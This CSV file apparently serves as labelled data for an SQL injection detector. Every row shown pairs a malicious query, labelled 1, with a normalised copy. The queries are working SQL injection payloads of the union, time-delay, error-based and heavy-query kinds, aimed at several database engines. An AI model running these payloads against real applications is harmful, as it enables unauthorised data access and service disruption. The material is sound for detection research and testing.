Query,Label,Query_cleaned
"1' where 1673  =  1673 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1 where 1673 1673 and 4241 convert int select char 113 char 113 char 112 char 106 char 113 select case when 4241 4241 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113
"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1 or char 119 char 100 char 99 char 121 regexp_substring repeat right char 1441 0 5000000000 null
select   (  case when   (  7163  =  1777  )   then 1 else 7163*  (  select 7163 from master..sysdatabases  )   end  )  --,1,select case when 7163 1777 then 1 else 7163 select 7163 from master sysdatabases end
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",1,1 union all select null null null null null null null null null null
1'  )   as wjty where 2971  =  2971,1,1 as wjty where 2971 2971
"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""%""  =  """,1,1 and select from select sleep 5 fzno and
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",1,1 and 3202 like abcdefg upper hex randomblob 500000000 2 and imqi imqi
"select * from generate_series  (  3379,3379,case when   (  3379  =  1219  )   then 1 else 0 end  )   limit 1--",1,select from generate_series 3379 3379 case when 3379 1219 then 1 else 0 end limit 1
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu",1,1 and 3202 like abcdefg upper hex randomblob 500000000 2 and fqeu like fqeu
1' where 7613  =  7613,1,1 where 7613 7613
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'leps' like 'leps",1,call regexp_substring repeat right char 3702 0 500000000 null and leps like leps
"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",1,1 and 3707 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'toxr' like 'toxr,1,1 and 2853 cast chr 113 chr 113 chr 112 chr 106 chr 113 select case when 2853 2853 then 1 else 0 end text chr 113 chr 122 chr 118 chr 122 chr 113 as numeric and toxr like toxr
"1%""   )    )    union all select null,null,null,null,null,null,null,null#",1,1 union all select null null null null null null null null
"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1,1 or select 2 if select from select concat 0x7171706a71 select elt 8113 8113 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610 and
"1   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1 or 8156 select count from generate_series 1 5000000
"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1 where 4778 4778 and elt 3114 3114 sleep 5
"iif  (  1746  =  1730,1,1/0  )  ",1,iif 1746 1730 1 1 0
"1"" where 5062  =  5062",1,1 where 5062 5062
"1""  )   rlike sleep  (  5  )  #",1,1 rlike sleep 5
"1'+  (  select dagm where 5461  =  5461 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",1,1 select dagm where 5461 5461 or 8466 benchmark 5000000 md5 0x694a4745
-3938%'   )    )     )   or 2034  =  7209#,1,3938 or 2034 7209
1  )   as jmib where 8130  =  8130 rlike   (  select   (  case when   (  7885  =  3932  )   then 1 else 0x28 end   )    )   --,1,1 as jmib where 8130 8130 rlike select case when 7885 3932 then 1 else 0x28 end
"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""xmrq""  =  ""xmrq",1,1 or char 68 char 69 char 97 char 85 regexp_substring repeat right char 5389 0 5000000000 null and xmrq xmrq
"1%"" rlike sleep  (  5  )  #",1,1 rlike sleep 5
1 waitfor delay '0:0:5',1,1 waitfor delay 0 0 5
"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",1,3250 union all select 7162 7162 7162 7162 7162 7162 7162 7162 7162
"1%'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1 and char 107 char 121 char 97 char 80 regexp_substring repeat left crypt_key char 65 char 69 char 83 null 0 500000000 null
"1%""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,1,1 and 6969 select 6969 from pg_sleep 5 and
"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",1,1 where 1700 1700 union all select null null null null null
"-4480'  )   where 4661  =  4661 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,4480 where 4661 4661 or 1570 convert int select char 113 char 113 char 112 char 106 char 113 select case when 1570 1570 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113
1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,1,1 waitfor delay 0 0 5 and bbqk bbqk
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""jmjr"" like ""jmjr",1,1 and select 2 if select from select concat 0x7171706a71 select elt 3484 3484 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610 and jmjr like jmjr
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'omlt'  =  'omlt,1,1 and 2853 cast chr 113 chr 113 chr 112 chr 106 chr 113 select case when 2853 2853 then 1 else 0 end text chr 113 chr 122 chr 118 chr 122 chr 113 as numeric and omlt omlt
"-8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793#",1,8159 where 2793 2793 union all select 2793 2793 2793 2793 2793
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1,1 and char 120 char 106 char 117 char 85 regexp_substring repeat right char 9981 0 5000000000 null
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,1 and 4241 convert int select char 113 char 113 char 112 char 106 char 113 select case when 4241 4241 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113
-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,1,5880 or 2724 in char 113 char 113 char 112 char 106 char 113 select case when 2724 2724 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 and rwgl rwgl
"-6084'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'dfcp'  =  'dfcp",1,6084 or 1570 convert int select char 113 char 113 char 112 char 106 char 113 select case when 1570 1570 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 and dfcp dfcp
1'||  (  select 'lvso' where 5675  =  5675,1,1 select lvso where 5675 5675
"1%'  )   union all select null,null#",1,1 union all select null null
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'efwq' like 'efwq",1,1 or exp select from select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x and efwq like efwq
"-7008'   )    )    union all select 9080,9080,9080#",1,7008 union all select 9080 9080 9080
-9509'  )   where 9303  =  9303 order by 1#,1,9509 where 9303 9303 order by 1
1'  )   as lgex where 4068  =  4068 and 1378  =  9247--,1,1 as lgex where 4068 4068 and 1378 9247
1  )   as zodp where 9112  =  9112,1,1 as zodp where 9112 9112
"1""   )    )    as hzcq where 9250  =  9250 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,1 as hzcq where 9250 9250 and 4386 utl_inaddr get_host_address chr 113 chr 113 chr 112 chr 106 chr 113 select case when 4386 4386 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""ureu"" like ""ureu",1,1 or exp select from select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x and ureu like ureu
"1%""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1,1 or 8421 select count from generate_series 1 5000000 and
"-2745'  )   or elt  (  1032  =  1032,3623  )   and   (  'vfxq'  =  'vfxq",1,2745 or elt 1032 1032 3623 and vfxq vfxq
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",1,7422 union all select 9127 9127 9127 9127 9127 9127 9127 9127 9127 9127
"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",1,4121 union all select 2659 2659 2659 2659 2659 2659 2659 2659
end and '%'  =  ',1,end and
"1  )   union all select null,null#",1,1 union all select null null
"-5957   )    )     )   union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",1,5957 union all select 8485 8485 8485 8485 8485 8485 8485 8485 8485
1' waitfor delay '0:0:5',1,1 waitfor delay 0 0 5
select   (  case when   (  9030  =  6952  )   then 1 else 9030*  (  select 9030 from master..sysdatabases  )   end  )  --,1,select case when 9030 6952 then 1 else 9030 select 9030 from master sysdatabases end
"1'  )   as vmmk where 5757  =  5757 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1 as vmmk where 5757 5757 or 9643 select count from domain domains as t1 domain columns as t2 domain tables as t3
"1'+  (  select 'ngdk' where 7264  =  7264 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1,1 select ngdk where 7264 7264 and 3202 like abcdefg upper hex randomblob 500000000 2
"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",1,1 select mgel where 3591 3591 and 6055 ctxsys drithsx sn 6055 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 6055 6055 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113
"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",1,1 and 8514 select count from domain domains as t1 domain columns as t2 domain tables as t3 and 5507 5507
"1'  )   as jiic where 6158  =  6158 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1 as jiic where 6158 6158 or select 2 if select from select concat 0x7171706a71 select elt 8113 8113 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610
1' waitfor delay '0:0:5' and 'vwuz'  =  'vwuz,1,1 waitfor delay 0 0 5 and vwuz vwuz
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'gzlz' like 'gzlz",1,1 and 8514 select count from domain domains as t1 domain columns as t2 domain tables as t3 and gzlz like gzlz
"-1434'   )    )    union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",1,1434 union all select 4734 4734 4734 4734 4734 4734 4734 4734 4734 4734
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""fkdx"" like ""fkdx",1,select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and fkdx like fkdx
"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""eeye""  =  ""eeye",1,1 or 8315 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and eeye eeye
"1""  )   as rgbz where 6687  =  6687 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1 as rgbz where 6687 6687 and 2716 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7
"-1197""   )    )    as dfsy where 8857  =  8857 or 3038  =  3038",1,1197 as dfsy where 8857 8857 or 3038 3038
"1' in boolean mode  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  #",1,1 in boolean mode or 2633 dbms_pipe receive_message chr 112 chr 65 chr 65 chr 103 5
"1""   )    )     )   union all select null#",1,1 union all select null
"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",1,1 select hwyv from dual where 1155 1155 and 8407 select count from generate_series 1 5000000
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zpyx'  =  'zpyx",1,1 or exp select from select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x and zpyx zpyx
"1'||  (  select 'fmss' from dual where 7025  =  7025 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",1,1 select fmss from dual where 7025 7025 or 8421 select count from generate_series 1 5000000
"1""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1 as ltoa where 9159 9159 or exp select from select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x
"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",1,7887 union all select 9049 9049 9049 9049 9049 9049 9049 9049 9049 9049
"-8309'||  (  select 'qecl' where 8449  =  8449 union all select 8449,8449,8449,8449,8449,8449,8449--",1,8309 select qecl where 8449 8449 union all select 8449 8449 8449 8449 8449 8449 8449
"-7111 union all select 2409,2409,2409,2409,2409,2409#",1,7111 union all select 2409 2409 2409 2409 2409 2409
1'  )   where 6092  =  6092,1,1 where 6092 6092
"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,1 as lxjs where 6503 6503 procedure analyse extractvalue 5840 concat 0x5c 0x7171706a71 select case when 5840 5840 then 1 else 0 end 0x717a767a71 1
"-3035""  )   union all select 7912,7912,7912#",1,3035 union all select 7912 7912 7912
"-3321"" where 1603  =  1603 union all select 1603,1603,1603,1603#",1,3321 where 1603 1603 union all select 1603 1603 1603 1603
"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",1,1 as xuab where 4369 4369 union all select null null null
"1""  )   where 8878  =  8878 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1 where 8878 8878 or select 9173 from select count concat 0x7171706a71 select elt 9173 9173 1 0x717a767a71 floor rand 0 2 x from information_schema character_sets group by x a
"1%"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1,1 and 4386 utl_inaddr get_host_address chr 113 chr 113 chr 112 chr 106 chr 113 select case when 4386 4386 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 and
"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'subq' like 'subq",1,1 and 3824 benchmark 5000000 md5 0x76555642 and subq like subq
1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,1,1 and 6969 select 6969 from pg_sleep 5 and 9288 9288
"-8073   )    )     )   union all select 4481,4481,4481,4481--",1,8073 union all select 4481 4481 4481 4481
"1""   )    )    as tkmd where 3415  =  3415 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1 as tkmd where 3415 3415 and select 2 if select from select concat 0x7171706a71 select elt 3484 3484 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610
"-4319""  )   where 7534  =  7534 or 8246  =  3217",1,4319 where 7534 7534 or 8246 3217
"-6431""   )    )    union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",1,6431 union all select 2358 2358 2358 2358 2358 2358 2358 2358 2358 2358
1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,1,1 as pdrg where 5960 5960 and 9198 9198
waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,1,waitfor delay 0 0 5 and gsvt gsvt
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1,1947 union all select 7780 7780 7780 7780 7780 7780 7780 7780
"-3116""   )    )     )   union all select 4600,4600,4600,4600--",1,3116 union all select 4600 4600 4600 4600
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,1 or exp select from select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x
1 where 6304  =  6304,1,1 where 6304 6304
"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",1,3953 as wjjk where 6433 6433 or make_set 9354 9354 7185
1'  )   where 1115  =  1115,1,1 where 1115 1115
-7378' or 6872  =  6872 and 'bnmn' like 'bnmn,1,7378 or 6872 6872 and bnmn like bnmn
1   )    )    as ndrh where 6308  =  6308,1,1 as ndrh where 6308 6308
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'ulkq'  =  'ulkq,1,1 and 3754 select upper xmltype chr 60 chr 58 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 3754 3754 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 chr 62 from dual and ulkq ulkq
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""ikhr""  =  ""ikhr",1,1 procedure analyse extractvalue 9255 concat 0x5c benchmark 5000000 md5 0x52515a50 1 and ikhr ikhr
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""rphs""  =  ""rphs",1,1 and char 120 char 106 char 117 char 85 regexp_substring repeat right char 9981 0 5000000000 null and rphs rphs
"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",1,2568 or 8459 8459 4906 and exyw exyw
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""pebw"" like ""pebw",1,1 or extractvalue 1297 concat 0x5c 0x7171706a71 select elt 1297 1297 1 0x717a767a71 and pebw like pebw
"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",1,1447 union all select 3013 3013 3013 3013 3013 3013 3013
"1%'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '",1,1 or select 2 if select from select concat 0x7171706a71 select elt 8113 8113 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610 and
1 rlike   (  select   (  case when   (  8911  =  5301  )   then 1 else 0x28 end   )    )   # pmuh,1,1 rlike select case when 8911 5301 then 1 else 0x28 end pmuh
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'juhi' like 'juhi",1,select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and juhi like juhi
"1"" union all select null,null,null--",1,1 union all select null null null
1' in boolean mode  ) ,1,1 in boolean mode
1' where 6035  =  6035 waitfor delay '0:0:5'--,1,1 where 6035 6035 waitfor delay 0 0 5
"1  )   as rsyw where 4857  =  4857 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1 as rsyw where 4857 4857 or select 2 if select from select concat 0x7171706a71 select elt 8113 8113 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610
"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,1 and 8514 select count from domain domains as t1 domain columns as t2 domain tables as t3
1'  ) ,1,1
"1"" where 1765  =  1765 union all select null,null,null,null,null,null#",1,1 where 1765 1765 union all select null null null null null null
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",1,select count from domain domains as t1 domain columns as t2 domain tables as t3 and pnst pnst
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'fmkz' like 'fmkz",1,1 and 4241 convert int select char 113 char 113 char 112 char 106 char 113 select case when 4241 4241 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 and fmkz like fmkz
1 and 8398  =  1891-- naov,1,1 and 8398 1891 naov
"1'+  (  select vupb where 9575  =  9575 union all select null,null,null,null,null,null,null,null,null,null--",1,1 select vupb where 9575 9575 union all select null null null null null null null null null null
"1%""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""%""  =  """,1,1 and select 2 if select from select concat 0x7171706a71 select elt 3484 3484 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610 and
1'  )   as zdhq where 5586  =  5586,1,1 as zdhq where 5586 5586
1 where 7254  =  7254,1,1 where 7254 7254
"1' where 3425  =  3425 and elt  (  4249  =  4249,7259  )  --",1,1 where 3425 3425 and elt 4249 4249 7259
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""akha"" like ""akha",1,1 and make_set 8403 8403 8899 and akha like akha
"1%""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1 or 8156 select count from generate_series 1 5000000
1' where 7176  =  7176,1,1 where 7176 7176
"-5507' or elt  (  1032  =  1032,3623  )   and 'ndqw'  =  'ndqw",1,5507 or elt 1032 1032 3623 and ndqw ndqw
"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1 and 9660 select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'igqm'  =  'igqm",1,1 and select 9067 from select count concat 0x7171706a71 select elt 9067 9067 1 0x717a767a71 floor rand 0 2 x from information_schema character_sets group by x a and igqm igqm
